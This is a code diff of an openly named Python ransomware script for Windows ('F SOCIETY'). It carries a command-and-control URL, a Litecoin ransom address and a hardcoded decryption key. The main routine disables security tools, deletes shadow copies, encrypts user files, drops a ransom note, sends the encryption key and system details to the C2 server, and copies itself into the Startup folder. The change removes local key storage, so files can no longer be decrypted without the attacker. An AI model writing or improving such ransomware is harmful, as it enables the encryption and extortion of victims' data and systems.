@@ -19,8 +19,6 @@ C2_SERVER = "https://your-c2-server.com/report"
 LTC_ADDRESS = "LdyX3fNpWfUHowcHszy4uMNeL7ho6YUFXz"
 RANSOM_AMOUNT = "$250 USD in Litecoin"
 DECRYPT_KEY = "agent77"
-stored_key = None
-stored_iv = None
 
 def generate_key():
     return get_random_bytes(32)
@@ -247,7 +245,6 @@ def show_popup():
         0x10 | 0x1)
 
 def main():
-    global stored_key, stored_iv
     if len(sys.argv) >= 3 and sys.argv[1] == '--decrypt':
         if sys.argv[2] == DECRYPT_KEY:
             try:
@@ -266,26 +263,22 @@ def main():
                         sys.exit(0)
             except:
                 pass
-            if stored_key is not None and stored_iv is not None:
-                count = decrypt_all_files(stored_key, stored_iv)
-                ctypes.windll.user32.MessageBoxW(0, 
-                    f"DECRYPTION COMPLETE!\n{count} files restored.",
-                    "F SOCIETY", 0x40)
-                sys.exit(0)
         else:
             ctypes.windll.user32.MessageBoxW(0, 
                 "Invalid decryption key!",
                 "F SOCIETY", 0x10)
             sys.exit(1)
+    
+    # Encryption mode - no global variables needed
     try:
         key = generate_key()
         iv = generate_iv()
         key_hex = base64.b64encode(key).decode()
         iv_hex = base64.b64encode(iv).decode()
-        stored_key = key
-        stored_iv = iv
+        
         disable_security()
         delete_shadow_copies()
+        
         total_encrypted = 0
         for directory in get_target_directories():
             try:
@@ -293,16 +286,21 @@ def main():
                 total_encrypted += count
             except:
                 pass
+        
         change_wallpaper()
         create_ransom_note(key_hex, iv_hex)
+        
         system_info = f"{os.name} {sys.platform} {os.environ.get('COMPUTERNAME', 'Unknown')}"
         send_to_c2(key_hex, iv_hex, total_encrypted, system_info)
+        
         show_popup()
+        
         try:
             startup = os.environ.get('APPDATA', '') + '\\Microsoft\\Windows\\Start Menu\\Programs\\Startup'
             shutil.copy2(sys.argv[0], startup + '\\fsociety_ransomware.exe')
         except:
             pass
+        
     except:
         pass
 
